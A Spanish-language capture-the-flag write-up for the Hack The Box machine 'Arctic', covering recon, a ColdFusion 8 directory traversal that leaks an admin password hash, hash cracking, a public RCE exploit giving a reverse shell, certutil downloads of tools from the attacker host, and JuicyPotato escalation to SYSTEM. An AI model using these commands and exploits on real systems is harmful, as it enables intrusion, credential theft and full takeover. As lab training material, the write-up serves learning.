---
tags:
title: Artic - Easy (HTB)
permalink: /Artic-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---

---
# Reconocimiento

```bash
nmap -sCV -p135,8500,49154 10.129.250.175                                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-15 02:18 -03
Nmap scan report for 10.129.250.175
Host is up (0.58s latency).

PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  http    JRun Web Server
|_http-title: Index of /
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.35 seconds
```

## Website / Port 8500

Si me voy a la web por el puerto `8500` veo carpetar un archivos `.cfm`. El cual indica que probablemenete sea `ColdFusion` lo que corre por detras.

![image-center](/assets/images/{9C0609BC-800C-4721-ACC9-E353C5234F64}.png)

Y efectivamente, si me voy a la ruta `adminstrator`, veo la siguiente pagina, la cual me indica que si es ColdFusion lo que corre por detras.

![image-center](/assets/images/{81986CD4-4074-4AB5-82AF-D692F687BC52}.png)

Buscando por exploits, para este servicio.

```bash'
zs1n@htb[/htb]$ searchsploit adobe coldfusion
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                       | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                    | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                       | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)        | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Executi | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                             | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                         | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                        | cfm/webapps/36172.txt
**Adobe ColdFusion 8 - Remote Command Execution (RCE)** | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass                                 | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metasploit)                    | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection                           | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Metasploit)                 | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query String Cross-Site Script | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewizarduser.cfm' Query Strin | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard.cfm' Query String Cross-S | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchlog.cfm?startRow' Cross-Si | cfm/webapps/33168.txt
------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

Veo una cantidad enorme, pero para empezar de a poco voy a probar con el `Path Traversal`, donde por defecto el script indica una ruta en la cual parece que guarda propiedades de algunas contraseñas de la pagina o sistema. 

```bash
python2.7 pt.py 10.129.250.175 8500 "../../../../../../../lib/password.properties"
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
```

Ejecutando el mismo, recibo lo que parece un `hash` en cifrado `SHA1`. por lo que con `john` intento romper el mismo
Y veo que con éxito crackeo la pass.

```bash                                                 
john hash --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-AxCrypt"
Use the "--format=Raw-SHA1-AxCrypt" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "Raw-SHA1-Linkedin"
Use the "--format=Raw-SHA1-Linkedin" option to force loading these as that type instead
Warning: detected hash type "Raw-SHA1", but the string is also recognized as "ripemd-160"
Use the "--format=ripemd-160" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 512/512 AVX512BW 16x])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
happyday         (?)     
1g 0:00:00:00 DONE (2025-11-15 02:30) 100.0g/s 512000p/s 512000c/s 512000C/s randy1..babygrl
Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
Session completed. 
```

## Shell as tolis 

Por lo que podria intentar loguearme como el usuario `admin` en la pagina, ya que por defecto me selecciona a ese usuario.

![image-center](/assets/images/{CDE8AA6C-E89F-48CE-B96B-0C7DEF568319}.png)

Ademas si bajo un poco mas, puedo ver la version que corre.

![image-center](/assets/images/{41915B75-A745-49C6-A791-AADD109D47D0}.png)

Ahora seguido de esto, podria repettir el paso, y busca por alguna vulnerabilidad para esta version.

```bash
 searchsploit coldfusion 8                
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting                                                                                                      | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                                                                                                                   | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)                                                                                                      | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Code Execution (RCE)                                                                       | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserialization Remote Code Execution                                                              | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                                                                                                            | multiple/webapps/45979.txt
Adobe ColdFusion 2023.6 - Remote File Read                                                                                                               | multiple/webapps/52387.py
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scripting                                                                                        | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabilities                                                                                       | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)                                                                                                      | cfm/webapps/50057.py
[..snip..]
```

En concreto, me voy a bajar el de **`RCE`** para `Adobe ColdFusion 8`.

```bash
searchsploit -m cfm/webapps/50057.py     
  Exploit: Adobe ColdFusion 8 - Remote Command Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50057
     Path: /usr/share/exploitdb/exploits/cfm/webapps/50057.py
    Codes: CVE-2009-2265
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /home/zsln/Desktop/zsln/htb/artic/50057.py
```

Y lo modifico un poco, sobretodo modificando a donde se envia la shell y la `ip` del sistema objetivo.

```python
if __name__ == '__main__':
    # Define some information
    lhost = '10.10.17.19'
    lport = 4444
    rhost = "10.129.250.175"
    rport = 8500
    filename = uuid.uuid4().hex
```

Lo ejecuto.

```bash
python3 50057.py                                                                  

Generating a payload...
Payload size: 1497 bytes
Saved as: 1b9a60a32254412c86642c3104a81c06.jsp

Priting request...
Content-type: multipart/form-data; boundary=b3f9b3c812a84cd2af85ec03a218043d
Content-length: 1698

--b3f9b3c812a84cd2af85ec03a218043d
Content-Disposition: form-data; name="newfile"; filename="1b9a60a32254412c86642c3104a81c06.txt"
Content-Type: text/plain

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>

[..snip..]

Printing some information for debugging...
lhost: 10.10.17.19
lport: 4444
rhost: 10.129.250.175
rport: 8500
payload: 1b9a60a32254412c86642c3104a81c06.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...
```

Y desde nuestro listener `nc` recibo la shell como el usuario `tolis`

```powershell
sudo nc -nlvp 4444
[sudo] password for zsln: 
Sorry, try again.
[sudo] password for zsln: 
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.250.175] 49267
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

## Shell as nt authority\system


```powershell
C:\Users\tolis\Downloads>certutil -urlcache -split -f http://10.10.17.19/Churraskito.exe Ch.exe
certutil -urlcache -split -f http://10.10.17.19/Churraskito.exe Ch.exe
****  Online  ****
  0000  ...
  c800
CertUtil: -URLCache command completed successfully.
```

```powershell
C:\Users\tolis\Downloads>certutil -urlcache -split -f http://10.10.17.19/PrintSpoofer64.exe pf.exe
certutil -urlcache -split -f http://10.10.17.19/PrintSpoofer64.exe pf.exe
****  Online  ****
  0000  ...
  6a00
CertUtil: -URLCache command completed successfully.

C:\Users\tolis\Downloads>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

```bash
C:\Users\tolis\Downloads>certutil -urlcache -split -f http://10.10.17.19/JuicyPotato.exe jp.exe
certutil -urlcache -split -f http://10.10.17.19/JuicyPotato.exe jp.exe
****  Online  ****
  000000  ...
  054e00
CertUtil: -URLCache command completed successfully.
```

```powershell
C:\Users\tolis\Downloads>.\jp.exe -t * -p C:\Users\tolis\Downloads\rev.exe -l 443 
.\jp.exe -t * -p C:\Users\tolis\Downloads\rev.exe -l 443
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 443
....
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

Y desde mi `msf` recibo la shell como `nt authority\system`.

```powershell
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.17.19:4444 
[*] Sending stage (230982 bytes) to 10.129.250.175
[*] Meterpreter session 1 opened (10.10.17.19:4444 -> 10.129.250.175:49427) at 2025-11-15 03:12:52 -0300

meterpreter > shell
Process 3584 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

```powershell
C:\Windows\system32>type c:\users\administrator\desktop\root.txt
type c:\users\administrator\desktop\root.txt
06edeb6751e519860a3a13cff2a4bafe
```

`~Happy Hacking`